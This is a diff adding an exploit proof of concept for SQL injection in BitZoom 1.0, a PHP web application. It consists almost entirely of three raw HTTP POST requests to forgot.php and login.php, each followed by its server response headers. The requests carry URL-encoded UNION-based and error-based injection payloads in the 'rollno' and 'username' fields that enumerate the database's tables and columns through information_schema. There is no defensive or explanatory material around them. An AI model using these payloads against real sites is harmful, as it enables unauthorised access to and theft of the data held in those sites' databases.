@@ -1,0 +1,87 @@
+# Exploit Title: BitZoom 1.0 - 'rollno' SQL Injection
+# Dork: N/A
+# Date: 2018-11-14
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://bitzoom.sourceforge.io/
+# Software Link: https://excellmedia.dl.sourceforge.net/project/bitzoom/bitzoom-master.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/forgot.php
+# 
+POST /PATH/forgot.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=rsq0813q4hl4dtbfesogugiln3
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 572
+rollno=%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%33%2c%34%2c%35%2c(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2d%2d%20%2d
+HTTP/1.1 200 OK
+Date: Wed, 14 Nov 2018 11:17:49 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 2488
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2) 
+# http://localhost/[PATH]/forgot.php
+# 
+POST /PATH/forgot.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=rsq0813q4hl4dtbfesogugiln3
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 574
+username=%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%33%2c%34%2c%35%2c(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2d%2d%20%2d
+HTTP/1.1 200 OK
+Date: Wed, 14 Nov 2018 11:17:52 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 2486
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3) 
+# http://localhost/[PATH]/login.php
+# 
+POST /PATH/login.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 592
+username=%31%32%27%7c%28%53%65%6c%65%43%54%20%27%45%66%65%27%20%46%72%6f%4d%20%64%75%41%4c%20%57%68%65%52%45%20%31%31%30%3d%31%31%30%20%41%6e%44%20%28%73%65%4c%45%63%54%20%31%31%32%20%66%72%4f%4d%28%53%45%6c%65%63%54%20%43%6f%75%4e%54%28%2a%29%2c%43%6f%6e%43%41%54%28%44%41%54%41%42%41%53%45%28%29%2c%28%53%65%4c%45%63%74%20%28%45%4c%54%28%31%31%32%3d%31%31%32%2c%31%29%29%29%2c%46%4c%6f%6f%52%28%52%41%6e%64%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%72%6d%61%74%49%4f%4e%5f%53%63%68%45%4d%41%2e%50%6c%75%47%49%4e%53%20%67%72%4f%55%70%20%42%59%20%78%29%61%29%29%7c%27&password=Efe
+HTTP/1.1 200 OK
+Date: Wed, 14 Nov 2018 11:03:08 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 585
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
